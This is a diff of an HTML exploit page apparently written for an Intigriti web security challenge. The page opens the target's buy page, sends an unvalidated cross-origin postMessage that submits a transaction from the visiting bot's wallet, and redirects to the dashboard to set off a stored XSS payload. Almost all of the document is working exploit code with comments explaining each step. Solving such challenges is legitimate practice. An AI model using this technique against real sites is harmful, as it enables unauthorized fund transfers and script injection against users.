@@ -1,28 +1,34 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Exploit starting...</h1>
+    <h1>Exploit Loading...</h1>
     <script>
-        // 1. Open the buy page as a popup to ensure cookies are sent
-        const exploiter = window.open("https://challenge-0126.intigriti.io/buy.html?currency=1337COIN&price=1");
+        // 1. Open the vulnerable 'buy' page
+        // We use 1337COIN as it's the most likely to be in the admin's wallet
+        const challengeUrl = "https://challenge-0126.intigriti.io/buy.html?currency=1337COIN&price=1";
+        const botWin = window.open(challengeUrl);
 
         setTimeout(() => {
-            // 2. Trigger the transaction
-            exploiter.postMessage({
+            // 2. Exploit the unvalidated postMessage listener
+            console.log("Triggering transaction via postMessage...");
+            botWin.postMessage({
                 type: 'submitTransaction',
                 transaction: {
-                    toAddress: '1ad8f37699d158b520be8f7625df7a5452',
+                    toAddress: 'EXPLOTED',
                     currency: '1337COIN',
                     amount: 0.000001
                 }
             }, '*');
 
-            // 3. Crucial: Redirect the popup to the dashboard
-            // Doing it in the popup keeps the bot "on the same site"
+            // 3. Wait for the API to process, then move the bot to the dashboard
+            // When the dashboard loads, it fetches the transaction list,
+            // sees your nickname, and triggers the XSS payload.
             setTimeout(() => {
-                exploiter.location.href = "https://challenge-0126.intigriti.io/dashboard.html";
+                console.log("Redirecting to dashboard to trigger XSS...");
+                botWin.location.href = "https://challenge-0126.intigriti.io/dashboard.html";
             }, 2000);
-        }, 4000);
+
+        }, 4000); // Wait 4s to ensure wallets are loaded in the bot's browser
     </script>
 </body>
 </html>
